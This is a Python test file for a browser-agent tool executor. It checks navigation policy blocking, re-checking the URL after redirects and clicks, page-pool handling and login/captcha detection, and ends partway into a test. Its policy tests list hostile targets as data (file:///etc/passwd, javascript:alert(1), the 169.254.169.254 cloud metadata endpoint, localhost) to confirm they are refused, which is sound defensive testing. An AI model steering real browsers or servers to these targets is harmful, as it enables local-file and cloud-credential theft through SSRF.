"""T4 接线单测：AppToolExecutor 的 6 个 Tier3 浏览器工具。

覆盖主线：**policy 门**（navigate 之前把关、拒绝路径绝不建页/导航）、**动作后 URL 复查**
（重定向/点击跳转/JS 跳转回流后的落点也要在策略内，I2）、**当前页跟踪**（open 复用同一个 page；
snapshot/click/type/scroll 都作用在它身上；池回收后的恢复与 ``aclose()`` 释放，I3）、
**结构化降级**（未注入池 / 池未启动 / 快照为空 / 动作失败 一律返回 ToolResult，绝不抛）、
**D5/D6 HITL 桥**（open/click/type 之后采样**渲染后可见文本**（F1：``body.inner_text()``；
原始 HTML 绝不进检测），命中登录/验证码后按置信度处置：high → 挂 ``needs_human`` +
``human_prompt`` + ``intervention``（F2：medium 只留 ``intervention`` 痕迹、不暂停）；
检测失败绝不影响动作结果）。

不启真实浏览器（教训 §1）：FakeBrowser / FakePage 双人舞——page 的 ``calls`` 保留跨方法
的时间顺序（用来 pin "先 aria-ref 定位再 click"、"type 先清空再填"），失败可编程
（goto / networkidle 等待 / snapshot / click / **fill** / JS 回退 / evaluate / **可见文本 / 密码框探测**），
跳转可编程（``redirect_url`` / ``click_url`` / ``evaluate_url`` / **``js_fallback_url``**，
动作后复查的测试缝），``visible_text`` / ``password_inputs`` 是登录/验证码检测的测试缝（``html``
只出现在 F1 负例里，``content()`` 是"原始 HTML 被误采样"的探针），``closed`` 可以模拟池回收；
FakeBrowser 实现 executor 用到的 ``new_page()`` / ``release()`` / ``discard()``（F4），
并记录建页次数、归还与弃用（当前页复用、隔离、失败页弃用的证据）。
真浏览器冒烟是 T6 的独立脚本，不入 pytest。
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest
from playwright.async_api import Error as PlaywrightError
from playwright.async_api import TimeoutError as PlaywrightTimeoutError

from browsepilot.agent.tools import ToolExecutor
from browsepilot.app.browser.detect import MAX_HTML_SAMPLE_CHARS, detect_intervention
from browsepilot.app.browser.policy import NavigationPolicy
from browsepilot.app.executor import MAX_JS_RESULT_CHARS, AppToolExecutor
from browsepilot.app.services.weather import Weather

BROWSER_TOOLS = [
    "browser_open",
    "browser_snapshot",
    "browser_click",
    "browser_type",
    "browser_scroll",
    "browser_execute_js",
]

# Playwright 1.59 ai 模式实况（见 test_browser_snapshot.py）：[ref=eN] 只在 mode="ai" 下产生。
ARIA_YAML = """- generic [ref=e1]:
  - heading "Example Domain" [level=1] [ref=e2]
  - link "More information..." [ref=e4]
"""

DEFAULT_HTML = "<html><body><h1>Example Domain</h1><p>This domain is for use in examples.</p></body></html>"
"""默认原始 HTML：普通页面（F1 之后 executor **不采样**原始 HTML；保留为负例缝）。"""

DEFAULT_TEXT = "Example Domain This domain is for use in examples."
"""默认可见文本：``body.inner_text()`` 的形状（标签被剥掉，只剩用户看得见的文案）。"""

LOGIN_HTML = (
    "<html><body><form>账号 <input name='user'>密码 <input type='password'>"
    "<button>登录</button></form></body></html>"
)
"""登录页原始 HTML：中文入口词 + 凭据词 + 密码框（真实登录页的最小形态）。"""

LOGIN_TEXT = "账号 密码 登录"
"""登录页的可见文本：标签被剥掉后仍是入口词 + 凭据词。"""

CAPTCHA_HTML = "<html><body><p>请完成人机验证：点击验证后继续</p></body></html>"

CAPTCHA_TEXT = "请完成人机验证：点击验证后继续"
"""验证码页的可见文本：用户看得见的“要人来做验证”文案。"""

HIDDEN_LOGIN_HTML = (
    "<html><body><nav><a href='/signin'>登录</a></nav>"
    "<div style='display:none'><label>账号</label><input name='user'>"
    "<label>密码</label><input type='password'></div>"
    "<div style='display:none'><script>var i18n = {'captcha': '验证码'}</script></div>"
    "</body></html>"
)
"""F1（T5 审查）的实例：电商产品页的常见形态 —— 可见的「登录」导航链接 +
``display:none`` 的隐藏登录下拉（账号/密码）+ 隐藏 i18n bundle（含「验证码」）。

原始 HTML 里关键词一应俱全（旧接线采样 ``page.content()`` → 入口词 + 凭据词 → 误报
``login/medium``，把唯一的人工暂停机会花在用户根本看不见的表单上）。"""

HIDDEN_LOGIN_TEXT = "首页 登录 购物车"
"""上面那个页面的可见文本：只有导航栏的入口词，没有凭据词 → 不命中任何规则（F1）。"""


# ── fake page / browser（executor 的测试缝） ──────────────────────────────────


class FakeResponse:
    def __init__(self, status: int = 200) -> None:
        self.status = status


class FakeLocator:
    def __init__(self, page: FakePage, selector: str) -> None:
        self._page = page
        self.selector = selector

    async def aria_snapshot(self, *, mode: str = "ai") -> str:
        self._page.calls.append(("aria_snapshot", self.selector, mode))
        if self._page.fail_snapshot:
            raise RuntimeError("aria snapshot unavailable")
        return self._page.snapshot_tree

    async def click(self, *, timeout: float | None = None) -> None:
        self._page.calls.append(("click", self.selector))
        if self._page.click_url is not None:  # 点链接/弹窗跳转（动作后 URL 复查的测试缝）
            self._page.url = self._page.click_url
        if self._page.fail_click:
            raise PlaywrightTimeoutError(f"click timeout: {self.selector}")

    async def fill(self, value: str, *, timeout: float | None = None) -> None:
        self._page.calls.append(("fill", self.selector, value))
        if self._page.fail_fill:  # Playwright 尝试全失败 → 动作层落到 JS 兜底
            raise PlaywrightTimeoutError(f"fill timeout: {self.selector}")

    async def evaluate(self, expression: Any, arg: Any = None, *, timeout: float | None = None):
        self._page.calls.append(("locator_evaluate", self.selector, expression))
        if self._page.js_fallback_url is not None:  # JS 兜底把页面带出去（I1：type 复查的测试缝）
            self._page.url = self._page.js_fallback_url
        if self._page.fail_locator_evaluate:
            raise PlaywrightTimeoutError(f"js fallback timeout: {self.selector}")
        return True

    async def count(self) -> int:
        """D5/D6 密码框探测：只有密码选择器才返回计数（别的选择器动作层从不 count）。"""
        self._page.calls.append(("count", self.selector))
        if self._page.fail_password_count:
            raise RuntimeError(f"count unavailable: {self.selector}")
        return self._page.password_inputs if "password" in self.selector else 0

    async def inner_text(self, *, timeout: int | None = None) -> str:
        """F1 可见文本采样（executor 只对 ``body`` 调用）：隐藏子树与 ``<script>`` 不在其中。"""
        self._page.calls.append(("inner_text", self.selector))
        if self._page.fail_inner_text:
            raise RuntimeError(f"inner_text unavailable: {self.selector}")
        return self._page.visible_text

    async def scroll_into_view_if_needed(self, *, timeout: float | None = None) -> None:
        self._page.calls.append(("scroll_into_view", self.selector))


class FakeMouse:
    def __init__(self, page: FakePage) -> None:
        self._page = page

    async def wheel(self, delta_x: float, delta_y: float) -> None:
        self._page.calls.append(("wheel", delta_x, delta_y))


class FakePage:
    """记录调用序、可编程失败的假 page（只实现 executor/actions 真正用到的方法）。"""

    def __init__(
        self,
        *,
        url: str = "https://example.com/",
        snapshot_tree: str = ARIA_YAML,
        js_result: Any = "Example Domain",
        html: str = DEFAULT_HTML,
        visible_text: str = DEFAULT_TEXT,
        password_inputs: int = 0,
    ) -> None:
        self.url = url
        self.snapshot_tree = snapshot_tree
        self.js_result = js_result
        self.html = html  # 原始 HTML：F1 之后 executor 不该再采样它（负例缝）
        self.visible_text = visible_text  # D5/D6 采样缝：body.inner_text() 的渲染后可见文本
        self.password_inputs = password_inputs  # D5/D6：input[type=password] 的匹配数
        self.calls: list[tuple] = []
        self.goto_calls: list[str] = []
        self.closed = False  # 池回收（dispose → close）后为 True
        self.redirect_url: str | None = None  # goto 跟随重定向后的最终 URL
        self.click_url: str | None = None  # 点击链接/弹窗后的 URL
        self.evaluate_url: str | None = None  # JS 跳转后的 URL
        self.fail_goto = False
        self.goto_exc: Exception | None = None  # 驱动级 goto 异常（如 net::ERR_NAME_NOT_RESOLVED）
        self.fail_networkidle_wait = False
        self.fail_snapshot = False
        self.fail_click = False
        self.fail_fill = False  # type 的 Playwright 尝试失败 → 走 JS 赋值兜底（I1 测试缝）
        self.fail_locator_evaluate = False
        self.fail_evaluate = False
        self.fail_inner_text = False  # D5/D6：采样失败必须降级成“没发现”
        self.fail_password_count = False
        self.js_fallback_url: str | None = None  # JS 兜底后的 URL（I1：type 复查的测试缝）
        self.mouse = FakeMouse(self)

    async def goto(self, url: str, *, wait_until: str | None = None, timeout: float | None = None):
        self.goto_calls.append(url)
        self.calls.append(("goto", url, wait_until))
        if self.goto_exc is not None:  # 驱动级失败（生产路径：Playwright 网络错误）
            raise self.goto_exc
        if self.fail_goto:
            raise RuntimeError("net::ERR_NAME_NOT_RESOLVED")
        self.url = self.redirect_url if self.redirect_url is not None else url
        return FakeResponse()

    def is_closed(self) -> bool:
        return self.closed

    async def wait_for_load_state(self, state: str | None = None, *, timeout: float | None = None):
        self.calls.append(("wait_for_load_state", state))
        if self.fail_networkidle_wait:
            raise PlaywrightTimeoutError("networkidle wait bounded out")

    def locator(self, selector: str) -> FakeLocator:
        self.calls.append(("locator", selector))
        return FakeLocator(self, selector)

    def get_by_text(self, text: str, *, exact: bool | None = False) -> FakeLocator:
        self.calls.append(("get_by_text", text, exact))
        return FakeLocator(self, f"text={text}")

    async def evaluate(self, expression: Any):
        self.calls.append(("evaluate", expression))
        if self.fail_evaluate:
            raise RuntimeError("Evaluation failed: ReferenceError")
        if self.evaluate_url is not None:  # JS 跳转（静态黑名单漏网时的兜底测试缝）
            self.url = self.evaluate_url
        return self.js_result

    async def content(self) -> str:
        """原始 HTML 采样——F1 之后 executor **不该再调用**：留成「被调用即留证据」的探针。

        不删掉它：删了的话误用会变成 ``AttributeError`` → 被采样器的兜底 try/except 吞成
        空串，故障反而变隐蔽（测试断言也失去 ``("content",)`` 这个直接证据）。
        """
        self.calls.append(("content",))
        return self.html


class FakeBrowser:
    """BrowserPool 替身：只实现 executor 用到的 new_page()/release()/discard()；可注入启动失败。"""

    def __init__(self, page: FakePage | None = None, *, start_error: Exception | None = None):
        self._page = page
        self.start_error = start_error
        self.created: list[FakePage] = []
        self.new_page_calls = 0
        self.released: list[FakePage] = []
        self.discarded: list[FakePage] = []

    async def start(self) -> None:  # pragma: no cover - 池生命周期由 app 接线负责
        pass

    async def close(self) -> None:  # pragma: no cover
        pass

    async def release(self, page: FakePage) -> None:
        self.released.append(page)

    async def discard(self, page: FakePage) -> None:
        """F4：弃用页面（真池 = 移出 busy/idle + close）；死页不再被 new_page() 发出去。"""
        self.discarded.append(page)
        page.closed = True

    async def new_page(self) -> FakePage:
        self.new_page_calls += 1
        await asyncio.sleep(0)  # 真实建页有 await 点：并发测试需要这个让出点
        if self.start_error is not None:
            raise self.start_error
        if self._page is None or self._page.is_closed():
            self._page = FakePage()  # 池回收后是新建/复用 idle（不会把死页再交出去）
        self.created.append(self._page)
        return self._page


# ── executor 骨架（Tier1/2 服务只是占位：本文件只测 Tier3 接线） ────────────────


class FakeWeather:
    async def get(self, city: str) -> Weather:
        return Weather(city=city, temperature_c=25.0, conditions="晴")


class FakeSearch:
    async def search(self, query: str, max_results: int = 5):
        return []


class FakeFetch:
    async def fetch(self, url: str):
        return None


def make_executor(browser: Any = None, policy: NavigationPolicy | None = None) -> AppToolExecutor:
    return AppToolExecutor(
        FakeWeather(), FakeSearch(), FakeFetch(), browser=browser, policy=policy
    )


# ── 工具清单 / 无池降级 ──────────────────────────────────────────────────────


def test_executor_with_browser_still_implements_protocol():
    assert isinstance(make_executor(FakeBrowser()), ToolExecutor)


@pytest.mark.asyncio
async def test_browser_tools_listed_with_parameters():
    tools = {t.name: t for t in await make_executor(FakeBrowser()).list_tools()}
    assert set(BROWSER_TOOLS) <= set(tools)
    assert tools["browser_open"].parameters == {"url": "string"}
    assert tools["browser_click"].parameters == {"ref": "string"}
    assert tools["browser_type"].parameters == {"ref": "string", "text": "string"}
    assert tools["browser_scroll"].parameters == {"direction": "string"}
    assert tools["browser_execute_js"].parameters == {"expression": "string"}
    assert all(tools[name].description for name in BROWSER_TOOLS)


@pytest.mark.asyncio
async def test_click_and_type_specs_document_the_target_alias():
    """M-a：spec 只广告 ``ref``，而 agent 层（BrowserParams）发的是 ``target``——

    两个名字 executor 都收（:func:`_arg` 宽容别名），但模型需要从 spec 里知道这一点。
    """
    tools = {t.name: t for t in await make_executor(FakeBrowser()).list_tools()}
    assert "target" in tools["browser_click"].description
    assert "target" in tools["browser_type"].description


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("browser_open", {"url": "https://example.com/"}),
        ("browser_snapshot", {}),
        ("browser_click", {"ref": "e2"}),
        ("browser_type", {"ref": "e2", "text": "x"}),
        ("browser_scroll", {"direction": "down"}),
        ("browser_execute_js", {"expression": "document.title"}),
    ],
)
async def test_browser_tools_without_pool_degrade_structured(tool, arguments):
    """未注入 BrowserPool：6 个工具都必须返回明确的结构化错误（绝不抛异常）。"""
    result = await make_executor().call(tool, arguments)
    assert result.status == "error"
    assert result.error_type == "browser_unavailable"
    assert "浏览器" in result.error_message


# ── policy 门（navigate 前把关） ─────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("url", "expected_code"),
    [
        ("file:///etc/passwd", "protocol_blocked"),
        ("javascript:alert(1)", "protocol_blocked"),
        ("http://127.0.0.1:8000/admin", "private_address_blocked"),
        ("http://169.254.169.254/latest/meta-data/", "private_address_blocked"),
        ("http://localhost:5173/", "private_address_blocked"),
        (" https://example.com/", "invalid_url"),
    ],
)
async def test_browser_open_gates_url_before_navigating(url, expected_code):
    """T2 交接：actions.navigate 自身不设防（可开 file://），把关必须在 executor 这一层。"""
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_open", {"url": url})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert expected_code in result.error_message  # policy 的稳定 reason code 直达用户
    assert result.data["reason"].startswith(expected_code)
    assert browser.new_page_calls == 0  # 拒绝路径上不建页、不导航
    assert browser.created == []


@pytest.mark.asyncio
async def test_browser_open_missing_url_is_blocked_by_policy():
    """url 缺失/非字符串同样走 policy 门（单一关口：reason 里带 invalid_url）。"""
    browser = FakeBrowser()
    ex = make_executor(browser)
    for arguments in ({}, {"url": None}, {"url": 123}):
        result = await ex.call("browser_open", arguments)
        assert result.status == "error"
        assert result.error_type == "navigation_blocked"
        assert "invalid_url" in result.error_message
    assert browser.new_page_calls == 0


@pytest.mark.asyncio
async def test_browser_open_uses_injected_allowlist_policy():
    """policy 可注入：allowlist 模式下白名单外的域名被拒、白名单内放行。"""
    browser = FakeBrowser()
    ex = make_executor(browser, policy=NavigationPolicy("allowlist", ["example.com"]))
    blocked = await ex.call("browser_open", {"url": "https://evil.com/"})
    assert blocked.error_type == "navigation_blocked"
    assert "domain_not_allowed" in blocked.error_message
    allowed = await ex.call("browser_open", {"url": "https://www.example.com/start"})
    assert allowed.status == "success"
    assert browser.created[0].goto_calls == ["https://www.example.com/start"]


@pytest.mark.asyncio
async def test_browser_open_policy_defaults_to_settings(monkeypatch):
    """不注入 policy 时由 Settings（BP_ 环境）构造：默认 allow_https 放行公网、挡内网。"""
    monkeypatch.setenv("BP_NAVIGATION_POLICY", "allow_https")
    browser = FakeBrowser()
    ex = make_executor(browser)
    blocked = await ex.call("browser_open", {"url": "http://192.168.1.1/"})
    assert blocked.error_type == "navigation_blocked"
    assert "private_address_blocked" in blocked.error_message
    assert (await ex.call("browser_open", {"url": "https://example.com/"})).status == "success"


# ── 当前页跟踪 ───────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_browser_open_returns_navigation_data():
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/page"})
    assert result.status == "success"
    assert result.data["requested_url"] == "https://example.com/page"
    assert result.data["url"] == "https://example.com/page"
    assert result.data["status"] == 200
    assert browser.created[0].goto_calls == ["https://example.com/page"]
    assert "已打开" in result.content


@pytest.mark.asyncio
async def test_browser_open_reuses_the_same_page_across_calls():
    browser = FakeBrowser()
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/a"})
    await ex.call("browser_open", {"url": "https://example.com/b"})
    assert browser.new_page_calls == 1  # 同一个 current page，不额外占池
    assert browser.created[0].goto_calls == ["https://example.com/a", "https://example.com/b"]


@pytest.mark.asyncio
async def test_browser_open_failure_discards_the_poisoned_page():
    """F4（T6 冒烟 S6 确定性复现的竞态）：失败导航的页面必须被**弃用**，不能留给下一次复用。

    失败导航之后浏览器会把页面带去 ``chrome-error://chromewebdata/``，而这个错误页导航可能
    还在飞：复用同一页的下一次 ``goto`` 会被它打断（"... is interrupted by another navigation
    to \"chrome-error://chromewebdata/\""）→ 下一次 browser_open 假失败。
    弃用（丢引用 + 让池关掉它）+ 下一次重新取干净页，才是不依赖时序的修法。
    """
    page = FakePage()
    page.fail_goto = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)

    failed = await ex.call("browser_open", {"url": "https://example.com/down"})

    assert failed.status == "error"
    assert failed.error_type == "navigation_failed"
    assert browser.released == []  # 绝不回 idle：脏页会被下一个消费者取走
    assert browser.discarded == [page]  # 弃用
    assert page.closed is True  # 池真的关掉了它
    # 观察类调用也不会续在脏页上动作（死页立即丢引用）
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    # 下一次导航自动重获**干净**页（不是失败过的那个）
    again = await ex.call("browser_open", {"url": "https://example.com/up"})
    assert again.status == "success"
    assert browser.new_page_calls == 2
    assert browser.created[-1] is not page


@pytest.mark.asyncio
async def test_browser_open_tolerates_networkidle_timeout():
    """有界等待超时只说明"页面还没静"，不是失败（T2 的 D3 语义）。"""
    page = FakePage()
    page.fail_networkidle_wait = True
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/slow"}
    )
    assert result.status == "success"
    assert result.data["wait_timeout"] is True


@pytest.mark.asyncio
async def test_browser_open_normalises_driver_navigation_errors():
    """C3b 归因：真实 DNS 失败/连接被拒由 Playwright 抛成笼统的 ``Error`` → actions 只能归成
    ``playwright_error``；而 browser_open 这一步**只可能**是导航失败 —— 必须留在
    ``navigation_failed`` 这一档，P4 才能把"页面打不开"与"浏览器/驱动坏了"分开。

    真浏览器复验（msedge，2026-09）：``https://no-such-host-….invalid/`` 走的正是这条路径。
    """
    page = FakePage()
    page.goto_exc = PlaywrightError(
        "Page.goto: net::ERR_NAME_NOT_RESOLVED at https://nope.invalid/"
    )
    browser = FakeBrowser(page)

    result = await make_executor(browser).call("browser_open", {"url": "https://nope.invalid/"})

    assert result.status == "error"
    assert result.error_type == "navigation_failed"
    assert result.data["driver_error_type"] == "playwright_error"  # 原档位不丢
    assert "ERR_NAME_NOT_RESOLVED" in result.error_message
    assert browser.discarded == [page]  # 错误页弃用（不 release）


@pytest.mark.asyncio
async def test_browser_pool_not_started_degrades_to_browser_unavailable():
    browser = FakeBrowser(start_error=RuntimeError("BrowserPool.new_page() called before start()"))
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/"})
    assert result.status == "error"
    assert result.error_type == "browser_unavailable"
    assert "start()" in result.error_message


@pytest.mark.asyncio
async def test_concurrent_opens_share_one_page():
    """并发 open 也不会各建一个 page（检查 current page 与建页之间没有互斥时会）。"""
    browser = FakeBrowser()
    ex = make_executor(browser)
    await asyncio.gather(
        ex.call("browser_open", {"url": "https://example.com/a"}),
        ex.call("browser_open", {"url": "https://example.com/b"}),
    )
    assert browser.new_page_calls == 1
    assert browser.created[0].goto_calls == ["https://example.com/a", "https://example.com/b"]


@pytest.mark.asyncio
async def test_closed_current_page_is_reacquired_on_next_open():
    """I3：池到上限会回收最老的 busy page（dispose → close）——死页不能再当当前页。

    不检查的话 ``self._page`` 永远指向死页：之后每个浏览器调用都失败、无法恢复，
    而且那个池槽也永远不释放。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/a"})
    page.closed = True  # 池回收
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    result = await ex.call("browser_open", {"url": "https://example.com/b"})
    assert result.status == "success"
    assert browser.new_page_calls == 2  # 重新取页（而不是复用死页）
    fresh = browser.created[-1]
    assert fresh is not page
    assert fresh.goto_calls == ["https://example.com/b"]


@pytest.mark.asyncio
async def test_aclose_releases_current_page_back_to_pool():
    """I3：显式释放——不回池的话一个池槽被永久占住（max_pages=3 时三个会话就占满）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    await ex.aclose()
    assert browser.released == [page]
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    await ex.aclose()  # 幂等：没有当前页时不重复归还
    assert browser.released == [page]


@pytest.mark.asyncio
async def test_aclose_does_not_return_a_dead_page_to_the_pool():
    """已关闭的页面不入 idle：``new_page()`` 会原样取出 idle，放死页等于把故障传染给下一个调用者。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.closed = True
    await ex.aclose()
    assert browser.released == []


# ── snapshot ────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_snapshot_without_open_page_is_structured_error():
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "no_open_page"
    assert "browser_open" in result.error_message
    assert browser.new_page_calls == 0  # 不偷偷建页：没有页面就是没有页面


@pytest.mark.asyncio
async def test_snapshot_returns_refs_for_click():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_snapshot", {})
    assert result.status == "success"
    assert "[ref=e2]" in result.content
    assert result.data["refs"] in result.content  # refs 原样保留（后面 click 要用）
    assert result.data["url"] == "https://example.com/"
    assert ("aria_snapshot", "body", "ai") in page.calls  # mode="ai" 是唯一产出 ref 的模式


@pytest.mark.asyncio
async def test_snapshot_marks_itself_observation_only():
    """M-b：快照是“看见了什么”，不是“做了什么”——答案模型不能由此推断发生过交互。

    答案节点只读 ``result_data``（graph.py 的 answer），所以标注要进 ``data``；
    ``content`` 同步带上，保持两个面一致。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "success"
    assert "仅观察" in result.content
    assert "仅观察" in result.data["note"]
    assert "未执行交互" in result.data["note"]


@pytest.mark.asyncio
async def test_snapshot_empty_page_is_failure_so_chain_can_degrade():
    """空快照按失败处理：策略链会继续降级（否则把"什么都没有"当成功汇报）。"""
    page = FakePage(snapshot_tree="")
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "empty_snapshot"


@pytest.mark.asyncio
async def test_snapshot_failure_is_structured():
    page = FakePage()
    page.fail_snapshot = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "snapshot_failed"
    assert "aria snapshot unavailable" in result.error_message


# ── click / type / scroll（委托给 actions，错误原样结构化） ───────────────────


@pytest.mark.asyncio
async def test_click_uses_aria_ref_for_snapshot_labels():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert ("click", "aria-ref=e2") in page.calls
    assert result.data["resolution"] == {"kind": "ref", "selector": "aria-ref=e2"}
    assert result.data["js_fallback"] is False


@pytest.mark.asyncio
async def test_click_accepts_target_alias_and_non_str_ref():
    """模型可能写 target/CSS/数字 ref：别名与强转都在这一层，actions 负责分级（T2 契约）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    text_hit = await ex.call("browser_click", {"target": "More information"})
    assert text_hit.status == "success"
    assert ("get_by_text", "More information", False) in page.calls
    numeric = await ex.call("browser_click", {"ref": 3})
    assert numeric.status == "success"
    assert ("click", "aria-ref=3") in page.calls


@pytest.mark.asyncio
async def test_click_missing_target_is_invalid_not_crash():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {})
    assert result.status == "error"
    assert result.error_type == "invalid_target"


@pytest.mark.asyncio
async def test_click_falls_back_to_js_and_reports_js_fallback():
    """Playwright 点击超时 → JS 兜底触发；js_fallback=True 意为"已派发，效果未证"。"""
    page = FakePage()
    page.fail_click = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["js_fallback"] is True
    assert any(call[0] == "locator_evaluate" for call in page.calls)


@pytest.mark.asyncio
async def test_click_failure_keeps_attempts_and_errors_from_actions():
    page = FakePage()
    page.fail_click = True
    page.fail_locator_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "timeout"
    assert result.data["attempts"] == 3  # 1 + ACTION_RETRIES(2)，ref 单候选
    assert result.data["target"] == "e2"
    assert result.data["errors"]  # 每次尝试的失败原因都保留给降级/诊断


@pytest.mark.asyncio
async def test_type_clears_before_filling_and_requires_text():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    filled = await ex.call("browser_type", {"ref": "e2", "text": "蓝牙耳机"})
    assert filled.status == "success"
    assert [call for call in page.calls if call[0] == "fill"] == [
        ("fill", "aria-ref=e2", ""),
        ("fill", "aria-ref=e2", "蓝牙耳机"),
    ]
    missing = await ex.call("browser_type", {"ref": "e2"})
    assert missing.status == "error"
    assert missing.error_type == "invalid_text"


@pytest.mark.asyncio
async def test_scroll_defaults_to_down_and_honours_direction_amount():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    default = await ex.call("browser_scroll", {})
    assert default.status == "success"
    assert ("wheel", 0, 500) in page.calls
    assert default.data["direction"] == "down"
    up = await ex.call("browser_scroll", {"direction": "up", "amount": 120})
    assert up.status == "success"
    assert ("wheel", 0, -120) in page.calls
    bad = await ex.call("browser_scroll", {"direction": "斜着"})
    assert bad.status == "error"
    assert bad.error_type == "invalid_direction"


# ── I2：动作后导航复查（点击/JS/重定向绕不过策略门） ──────────────────────────
# 违规页一律 **弃用**（discard，不 release）——release 会把违规源放回 idle，
# 下一个消费者（另一个会话）会原样取走它（P3 final review I2）。


@pytest.mark.asyncio
async def test_browser_open_revalidates_the_post_redirect_url():
    """goto 会跟随重定向：入参可能合法，最终落点却在策略外（云元数据端点）。"""
    page = FakePage()
    page.redirect_url = "http://169.254.169.254/latest/meta-data/"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    result = await ex.call("browser_open", {"url": "https://example.com/r"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "private_address_blocked" in result.error_message
    assert result.data["reason"].startswith("private_address_blocked")
    assert result.data["action"] == "browser_open"
    assert page.goto_calls == ["https://example.com/r"]  # 入参确实过了门（拦的是落点）
    # 违规页被隔离：后续调用不会继续在它上面动作；且**不**归还给池（I2）
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    assert browser.released == []  # 绝不回 idle
    assert browser.discarded == [page]  # 弃用（真池 = 关掉它）


@pytest.mark.asyncio
async def test_browser_click_navigation_is_revalidated():
    """点击链接/弹窗可以把页面带去任何地方（T2 实证：actions 自身不设防，能开 file://）。"""
    page = FakePage()
    page.click_url = "file:///etc/passwd"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "protocol_blocked" in result.error_message
    assert result.data["action"] == "browser_click"
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    assert browser.released == []
    assert browser.discarded == [page]


@pytest.mark.asyncio
async def test_click_that_navigated_despite_timeout_is_success():
    """C3a：跨页点击的"假失败"——动作已生效（URL 已变）却报 timeout（T6 冒烟实测 1/2）。

    点击触发导航时 Playwright 的 click 等待会被导航打断并报 timeout；两侧 URL 一比就知道
    点击其实生效了。按失败交出会把 P4 的成功任务算成失败，所以按"已生效"返回成功，
    同时把原错误留在数据里做诊断（复查看的还是**跳转后的落点**）。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/start"})
    page.click_url = "https://example.com/next"  # 点击后页面真的跳走了
    page.fail_click = True  # click 报 timeout（导航打断）
    page.fail_locator_evaluate = True  # JS 兜底也失败 → actions 交出错误结果

    result = await ex.call("browser_click", {"ref": "e2"})

    assert result.status == "success"
    assert result.data["navigated"] is True
    assert result.data["url"] == "https://example.com/next"
    assert result.data["url_before"] == "https://example.com/start"
    assert result.data["error_before_navigation"]["error_type"] == "timeout"
    assert browser.released == [] and browser.discarded == []  # 页面留在原地
    assert (await ex.call("browser_snapshot", {})).status == "success"


@pytest.mark.asyncio
async def test_click_failure_without_navigation_stays_error():
    """负对照：URL 没变 → 点击就是真的失败了，不得被"提升"成成功（假成功更难查）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/start"})
    page.fail_click = True
    page.fail_locator_evaluate = True

    result = await ex.call("browser_click", {"ref": "e2"})

    assert result.status == "error"
    assert result.error_type == "timeout"
    assert "navigated" not in result.data


@pytest.mark.asyncio
async def test_click_into_a_browser_error_page_is_reported_as_navigation_failure():
